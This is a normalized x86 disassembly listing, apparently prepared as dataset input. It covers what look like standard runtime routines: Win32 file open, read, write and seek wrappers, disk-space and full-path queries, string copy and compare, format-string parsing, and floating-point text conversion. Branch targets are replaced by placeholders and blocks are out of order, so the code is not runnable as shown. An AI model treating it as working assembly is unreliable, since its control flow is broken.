call CreateFileA
sub_408488
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_4044a8
push eax
call CreateFileA
pop ebx
retn
sub_4084b4
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4084e0
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_40850c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_40854c
push ebx
push esi
mov esi eax
mov eax esi
call sub_4042a8
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40c064
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_40857c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_4042a8
mov edi eax
mov eax ebx
call sub_4044a8
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_408864
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40c064
cmp al 0x2
jne r-xdata
dec edi
sub_4085cc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_40857c
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_404508
pop edi
pop esi
pop ebx
retn
sub_408604
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_4044a8
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_4040d8
add esp 0x108
pop esi
pop ebx
retn
sub_408640
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404de0
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404de0
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_4086f0
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_408718
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea eax [ edi - 0x1 ]
pop esi
pop edi
retn
sub_408744
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_408778
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_4042a8
push eax
mov eax ebx
call sub_4044a8
mov edx eax
mov eax esi
pop ecx
call sub_408744
pop esi
pop ebx
retn
sub_40879c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_4044a8
mov edx eax
mov ecx edi
mov eax ebx
call sub_408744
pop edi
pop esi
pop ebx
retn
sub_4087bc
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_4087e0
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408820
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408878
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_4088ec
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_4086b4
mov esi eax
inc esi
mov eax esi
call sub_4088cc
mov ecx esi
mov edx ebx
call sub_4086e0
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_408928
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40c088
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_4086e0
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407d1c
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_4089b0
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_408d07
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_408a92
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408ada
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_408a92
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_4089a4
pop edx
or edx edx
je r-xdata
sub_408a92
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_408d07
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408ada
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_408d07
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_408928
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_408b01 ]
mov ebx ecx
sub cl 0x44
je sub_4080cc
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_404210
jmp r-xdata
mov esi sub_404270
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_4080cc
sub cl 0x44
je sub_408060
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_408060
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_4080cc
mov ecx 0x10
cmp bl 0x58
je sub_408060
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_408980
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_408ec0
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_408060
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_408d28
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_4086b4
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_4089b0
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_408d68
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_4086b4
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_4089b0
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_408dbc
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_4042a8
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_4042a8
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_4042a8
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_4089b0
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_4040d8
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_403fe8
mov eax esi
mov edx ebx
call sub_404634
mov eax [ ebp - 0x4 ]
call sub_4042a8
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_4089b0
mov edx esi
xchg edx eax
call sub_404634
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_408e7c
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_408ec0
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_409194
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_408fbf
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_408fc9
call sub_408fbf
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408e7c
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_409025
call sub_408fbf
call sub_408fb6
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_408fb6
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408e7c
retn
xor ecx ecx
sub_409061
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_408fb6
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_408fb6
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_4090c6
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_40911a
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_409061
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_409194
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_4091c1
jmp r-xdata
call sub_4092e3
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_4091c1
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402dc4
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_4092e3
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_4093c0
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_409477
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_409482
neg edx
mov ecx esi
call sub_409482
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_409477
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_40949e
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402dc4
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_409482
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_40949e
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_4094d4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_408ec0
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_4040d8
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409504
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_408ec0
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_4040d8
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_409550
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_4044a8
mov edx esp
xor ecx ecx
call sub_4093c0
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_40957c
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_4044a8
mov edx esp
xor ecx ecx
call sub_4093c0
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_4095c4
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
